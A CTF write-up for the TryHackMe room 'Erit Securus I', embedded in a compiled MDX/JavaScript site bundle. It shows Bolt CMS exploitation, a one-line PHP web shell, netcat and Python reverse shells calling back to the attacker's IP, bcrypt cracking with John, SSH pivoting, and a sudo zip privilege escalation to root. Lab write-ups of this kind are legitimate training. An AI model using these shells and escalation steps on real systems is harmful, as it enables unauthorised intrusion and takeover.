"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[6951],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>m});var r=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var i=r.createContext({}),p=function(e){var t=r.useContext(i),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},u=function(e){var t=p(e.components);return r.createElement(i.Provider,{value:t},e.children)},c="mdxType",h={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,o=e.mdxType,a=e.originalType,i=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),c=p(n),d=o,m=c["".concat(i,".").concat(d)]||c[d]||h[d]||a;return n?r.createElement(m,s(s({ref:t},u),{},{components:n})):r.createElement(m,s({ref:t},u))}));function m(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var a=n.length,s=new Array(a);s[0]=d;var l={};for(var i in t)hasOwnProperty.call(t,i)&&(l[i]=t[i]);l.originalType=e,l[c]="string"==typeof e?e:o,s[1]=l;for(var p=2;p<a;p++)s[p]=n[p];return r.createElement.apply(null,s)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},3068:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>i,contentTitle:()=>s,default:()=>h,frontMatter:()=>a,metadata:()=>l,toc:()=>p});var r=n(87462),o=(n(67294),n(3905));const a={},s="Erit Securus I",l={unversionedId:"Tryhackme/Erit Securus I/Erit Securus I",id:"Tryhackme/Erit Securus I/Erit Securus I",title:"Erit Securus I",description:"Learn to exploit the BoltCMS software by researching exploit-db.",source:"@site/writeups/Tryhackme/Erit Securus I/Erit Securus I.md",sourceDirName:"Tryhackme/Erit Securus I",slug:"/Tryhackme/Erit Securus I/",permalink:"/writeups/Tryhackme/Erit Securus I/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Encryption - Crypto 101",permalink:"/writeups/Tryhackme/Encryption - Crypto 101/"},next:{title:"For Business Reasons",permalink:"/writeups/Tryhackme/For Business Reasons/"}},i={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Deploy box",id:"task-1-deploy-box",level:2},{value:"Task 2 Reconnaissance",id:"task-2-reconnaissance",level:2},{value:"Task 3 Webserver",id:"task-3-webserver",level:2},{value:"Task 4 Exploit",id:"task-4-exploit",level:2},{value:"Task 5 Reverse shell",id:"task-5-reverse-shell",level:2},{value:"Task 6 Priv esc",id:"task-6-priv-esc",level:2},{value:"Task 7 Pivoting",id:"task-7-pivoting",level:2},{value:"Task 8 Privesc #2",id:"task-8-privesc-2",level:2},{value:"Task 9 Root",id:"task-9-root",level:2}],u={toc:p},c="wrapper";function h(e){let{components:t,...n}=e;return(0,o.kt)(c,(0,r.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"erit-securus-i"},"Erit Securus I"),(0,o.kt)("p",null,"Learn to exploit the BoltCMS software by researching exploit-db."),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/eritsecurusi"},"Erit Securus I")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enuemration"),(0,o.kt)("li",{parentName:"ul"},"Exploitation Bolt CMS 3.7.0"),(0,o.kt)("li",{parentName:"ul"},"SQL Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Brute Forcing (Hash)"),(0,o.kt)("li",{parentName:"ul"},"Misconfigured Binaries (/usr/bin/zip)")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-deploy-box"},"Task 1 Deploy box"),(0,o.kt)("p",null,"Connect to network and deploy this machine. If you are unsure on how to get connected, complete the ",(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/openvpn"},"OpenVPN room")," first."),(0,o.kt)("p",null,"Deploy box"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("h2",{id:"task-2-reconnaissance"},"Task 2 Reconnaissance"),(0,o.kt)("p",null,"We run a simple nmap scan. You can learn more here (",(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/vulnversity"},"https://tryhackme.com/room/vulnversity"),")"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Erit Securus I$ sudo nmap -A -sS -sC -sV -O 10.10.149.194\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-11-15 14:27 CET\nNmap scan report for 10.10.149.194\nHost is up (0.033s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)\n| ssh-hostkey:\n|   1024 b1:ac:a9:92:d3:2a:69:91:68:b4:6a:ac:45:43:fb:ed (DSA)\n|   2048 3a:3f:9f:59:29:c8:20:d7:3a:c5:04:aa:82:36:68:3f (RSA)\n|   256 f9:2f:bb:e3:ab:95:ee:9e:78:7c:91:18:7d:95:84:ab (ECDSA)\n|_  256 49:0e:6f:cb:ec:6c:a5:97:67:cc:3c:31:ad:94:a4:54 (ED25519)\n80/tcp open  http    nginx 1.6.2\n|_http-generator: Bolt\n|_http-server-header: nginx/1.6.2\n|_http-title: Graece donan, Latine voluptatem vocant. | Erit Securus 1\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=11/15%OT=22%CT=1%CU=37378%PV=Y%DS=2%DC=T%G=Y%TM=5FB12C\nOS:DE%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=104%TI=Z%CI=I%II=I%TS=8)OPS\nOS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1\nOS:1NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN\nOS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 53/tcp)\nHOP RTT      ADDRESS\n1   32.81 ms 10.8.0.1\n2   32.98 ms 10.10.149.194\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 33.30 seconds\n")),(0,o.kt)("p",null,"How many ports are open?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"2")),(0,o.kt)("p",null,"What ports are open? Comma separated, lowest first: ",(0,o.kt)("strong",{parentName:"p"},",")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"22,80")),(0,o.kt)("h2",{id:"task-3-webserver"},"Task 3 Webserver"),(0,o.kt)("p",null,"Examine webserver. Identify what web-app is running."),(0,o.kt)("p",null,"What CMS is the website built on?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"\xa9 2020 \u2022 This website is Built with Bolt. ")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"Bolt")),(0,o.kt)("h2",{id:"task-4-exploit"},"Task 4 Exploit"),(0,o.kt)("p",null,"Download ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py"},"exploit")," for this app. The exploit works, but might not fire every time. If you first don't succeed..."),(0,o.kt)("p",null,"In the exploit from 2020-04-05, what language is used to write the exploit?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"Python")),(0,o.kt)("p",null,"As the exploit is authenticated, you will also need a username and password. Knowing the URI for the login-portal is also critical for the exploit to work. Find the login-portal and try login in."),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://docs.bolt.cm/3.6/manual/login"},"User Manual / Login")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.149.194/bolt/login"},"http://10.10.149.194/bolt/login")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"admin:password")),(0,o.kt)("h2",{id:"task-5-reverse-shell"},"Task 5 Reverse shell"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"python3 exploit.py http://ip username password")),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/aVvruKT.png",alt:null})),(0,o.kt)("p",null,"We can create a simple php-shell on the server, like this: ",(0,o.kt)("inlineCode",{parentName:"p"},"echo '<?php system($_GET[\"c\"]);?>'>c.php")," This we can use to upload a netcat reverse shell on the system and get a reverse shell, as there is no netcat on the box."),(0,o.kt)("p",null,"If you are using Kali Linux, the netcat installed supports the -e parameter (execute). Using this parameter we can start a shell upon connecting."),(0,o.kt)("p",null,"The e parameter is often removed from netcat in a lot of the Linux distributions, because it can be exploited to gain a shell. :-)"),(0,o.kt)("p",null,"First we link the installed netcat to the current directory on our attacking machine:"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"ln -s $(which nc) .")),(0,o.kt)("p",null,"Then we start a simple web server to serve some files, make sure the files you want to serve are in the current directory:"),(0,o.kt)("p",null,"This will listen on port 8000 on you local machine: ",(0,o.kt)("inlineCode",{parentName:"p"},"python3 -m http.server 8000")),(0,o.kt)("p",null,"Using the c.php file we just dropped, we can browse to ",(0,o.kt)("inlineCode",{parentName:"p"},"http://serverip/files/cmd.php?c=wget http://yourip:8000/nc")," to\ndownload a linux netcat to the server, you will see in your web server if it has been retrieved:"),(0,o.kt)("p",null,"This file is dropped in the same directory as our c.php. We make this nc executable like this: ",(0,o.kt)("inlineCode",{parentName:"p"},"http://serverip/files/cmd.php?c=chmod 755 nc")),(0,o.kt)("p",null,"Now start a netcat listener on your own machine, listening on a free port (we use 4444 here)"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"ncat -nv -l -p 4444")),(0,o.kt)("p",null,"When it is uploaded and made executable, we can run it like this: ",(0,o.kt)("inlineCode",{parentName:"p"},"http://serverip/files/cmd.php?c=./nc -e /bin/bash yourip 4444")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);\'\n')),(0,o.kt)("p",null,"If all goes well, you will see a connection coming in from the bolt server:\n(Don\u2019t forget to do the python pty dance, to make sure you have a shell with PTY\u2019s allocated, some commands, especially sudo, require a PTY shell to run)"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"python -c 'import pty;pty.spawn(\"/bin/bash\")'")),(0,o.kt)("p",null,"What is the username of the user running the web server?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"www-data")),(0,o.kt)("h2",{id:"task-6-priv-esc"},"Task 6 Priv esc"),(0,o.kt)("p",null,"In the app/database directory you will find the bolt.db SQLite3 database"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"file bolt.db")," bolt.db: SQLite 3.x database, last written using SQLite version 3020001"),(0,o.kt)("p",null,"Open database:"),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/Fajrmfg.png",alt:null})),(0,o.kt)("p",null,"This contains a lot of tables:"),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/fcS9AJM.png",alt:null})),(0,o.kt)("p",null,"We list the bolt user database, like this:"),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/WV9wdwV.png",alt:null})),(0,o.kt)("p",null,"We see two users, the admin we already own, the other one is a wild one. We also see another IP address, 192.168.100.1 (note to self)"),(0,o.kt)("p",null,'We copy the hash and save it to a file. Then run it through john the ripper, using the infamous "',(0,o.kt)("a",{parentName:"p",href:"https://en.wikipedia.org/wiki/RockYou"},"rockyou")," wordlist"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"john hash -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt")),(0,o.kt)("p",null,"Using this password, we try to su as the user wileec. This works, and we should find our first flag."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'www-data@Erit:/var/www/html/public/files$ cd /var/www/html/app/database\nwww-data@Erit:/var/www/html/app/database$ ls -la\ntotal 328\ndrwxrwxrwx  2 root root   4096 Nov 15 23:33 .\ndrwxrwxrwx 16 root root   4096 Apr 25  2020 ..\n-rwxrwxrwx  1 root root 327680 Nov 15 23:33 bolt.db\nwww-data@Erit:/var/www/html/app/database$ sqlite3 bolt.db\nSQLite version 3.16.2 2017-01-06 16:32:41\nEnter ".help" for usage hints.\nsqlite> .tables\nbolt_authtoken          bolt_field_value        bolt_pages\nbolt_blocks             bolt_homepage           bolt_relations\nbolt_content_changelog  bolt_log                bolt_showcases\nbolt_cron               bolt_log_change         bolt_taxonomy\nbolt_entries            bolt_log_system         bolt_users\nsqlite> select * from bolt_users;\n1|admin|$2y$10$C4b.yin4B2/2Q2uNT/Ns4.65A6LK6iUR/un3cViBvFWZs0mYtXXLK||0|a@a.com|2020-11-15 23:33:29|192.168.100.1|[]|1|||||["root","everyone"]\n2|wildone|$2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3p6bjOCGq.|Wile E Coyote|0|wild@one.com|2020-04-25 16:03:44|192.168.100.1|[]|1|||||["editor"]\nsqlite>\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Erit Securus I$ john wildone.hash -w=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nsnickers         (?)\n1g 0:00:00:03 DONE (2020-11-16 00:40) 0.2747g/s 138.4p/s 138.4c/s 138.4C/s pasaway..claire\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"wildone:snickers")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"www-data@Erit:/var/www/html/app/database$ su wileec\nPassword:\n$ bash\nwileec@Erit:/var/www/html/app/database$ cd ~\nwileec@Erit:~$ ls -la\ntotal 28\ndrwxr-xr-x 4 wileec wileec 4096 Apr 25  2020 .\ndrwxr-xr-x 4 root   root   4096 Apr 25  2020 ..\n-rw-r--r-- 1 wileec wileec  220 May 15  2017 .bash_logout\n-rw-r--r-- 1 wileec wileec 3526 May 15  2017 .bashrc\n-rw-r--r-- 1 wileec wileec  675 May 15  2017 .profile\ndrwxr-xr-x 2 wileec wileec 4096 Apr 25  2020 .ssh\n-rw-r--r-- 1 root   root     21 Apr 25  2020 flag1.txt\nwileec@Erit:~$ cat flag1.txt\nTHM{Hey!_Welcome_in}\n")),(0,o.kt)("p",null,"What is the users password?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"snickers")),(0,o.kt)("p",null,"Flag 1"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{Hey!_Welcome_in}")),(0,o.kt)("h2",{id:"task-7-pivoting"},"Task 7 Pivoting"),(0,o.kt)("p",null,"User wileec has a ssh private-key!"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"wileec@Erit:~$ ls -lart .ssh/\n-rw-r--r-- 1 wileec wileec  393 Apr 25 15:19 id_rsa.pub\n-rw------- 1 wileec wileec 1675 Apr 25 15:19 id_rsa\n-rw-r--r-- 1 wileec wileec  222 Apr 25 15:32 known_hosts\n")),(0,o.kt)("p",null,"Remember the other IP address? We could try to connect to that one, using the SSH key:"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"ssh wileec@192.168.100.1")),(0,o.kt)("p",null,"Remember: This has to be done from inside of the box, as this network is not available to you from the outside."),(0,o.kt)("p",null,"We can sudo!"),(0,o.kt)("p",null,"If you look at ",(0,o.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/"},"gtfobins")," we can see how we could leverage this."),(0,o.kt)("p",null,"The command is not going to work as it is, you must edit some parts."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"wileec@Erit:~$ ls -lart .ssh/\ntotal 20\n-rw-r--r-- 1 wileec wileec  393 Apr 25  2020 id_rsa.pub\n-rw------- 1 wileec wileec 1675 Apr 25  2020 id_rsa\n-rw-r--r-- 1 wileec wileec  222 Apr 25  2020 known_hosts\ndrwxr-xr-x 2 wileec wileec 4096 Apr 25  2020 .\ndrwxr-xr-x 4 wileec wileec 4096 Apr 25  2020 ..\nwileec@Erit:~$ ssh wileec@192.168.100.1\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sat Apr 25 12:36:02 2020 from 192.168.100.100\n$ sudo -l\nMatching Defaults entries for wileec on Securus:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser wileec may run the following commands on Securus:\n    (jsmith) NOPASSWD: /usr/bin/zip\n$\n")),(0,o.kt)("p",null,"User wileec can sudo! What can he sudo?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"(jsmith) NOPASSWD: /usr/bin/zip")),(0,o.kt)("h2",{id:"task-8-privesc-2"},"Task 8 Privesc #2"),(0,o.kt)("p",null,"Using the sudo-trick, we\u2019re now mr or mrs Smith (and admit, who does not want to be a Mr. or Mrs. Smith once in their life?), as an extra reward, there is flag 2 here."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ TF=$(mktemp -u)\n$ sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'\n  adding: etc/hosts (deflated 32%)\n$ sudo rm $TF\nrm: missing operand\nTry 'rm --help' for more information.\n$ SHELL=/bin/bash script -q /dev/null\njsmith@Securus:/home/wileec$ cd ~\njsmith@Securus:~$ ls -la\ntotal 24\ndrwxrwx--- 2 jsmith jsmith 4096 Apr 25  2020 .\ndrwxr-xr-x 4 root   root   4096 Apr 26  2020 ..\n-rw-r--r-- 1 jsmith jsmith  220 Nov  5  2016 .bash_logout\n-rw-r--r-- 1 jsmith jsmith 3515 Nov  5  2016 .bashrc\n-rw-r--r-- 1 jsmith jsmith   33 Apr 25  2020 flag2.txt\n-rw-r--r-- 1 jsmith jsmith  675 Nov  5  2016 .profile\njsmith@Securus:~$ cat flag2.txt\nTHM{Welcome_Home_Wile_E_Coyote!}\n")),(0,o.kt)("p",null,"Flag 2"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{Welcome_Home_Wile_E_Coyote!}")),(0,o.kt)("h2",{id:"task-9-root"},"Task 9 Root"),(0,o.kt)("p",null,"As jsmith, we again check for sudo rights (this btw, should be your first action on any box when gaining access to a account)"),(0,o.kt)("p",null,"There are several ways to exploit this rights. Go for it!"),(0,o.kt)("p",null,"What sudo rights does jsmith have?"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"jsmith@Securus:~$ sudo -l\nMatching Defaults entries for jsmith on Securus:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser jsmith may run the following commands on Securus:\n    (ALL : ALL) NOPASSWD: ALL\njsmith@Securus:~$ sudo -s\nroot@Securus:/home/jsmith# cd ~\nroot@Securus:~# ls -la\ntotal 28\ndrwx------  4 root root 4096 Apr 26  2020 .\ndrwxr-xr-x 22 root root 4096 Apr 17  2020 ..\nlrwxrwxrwx  1 root root    9 Apr 22  2020 .bash_history -> /dev/null\n-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc\n-rw-r--r--  1 root root   43 Apr 25  2020 flag3.txt\ndrwx------  2 root root 4096 Apr 23  2020 .gnupg\n-rw-r--r--  1 root root  140 Nov 19  2007 .profile\ndrwx------  2 root root 4096 Apr 17  2020 .ssh\nroot@Securus:~# cat flag3.txt\nTHM{Great_work!_You_pwned_Erit_Securus_1!}\n")),(0,o.kt)("p",null,"Flag 3"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{Great_work!_You_pwned_Erit_Securus_1!}")))}h.isMDXComponent=!0}}]);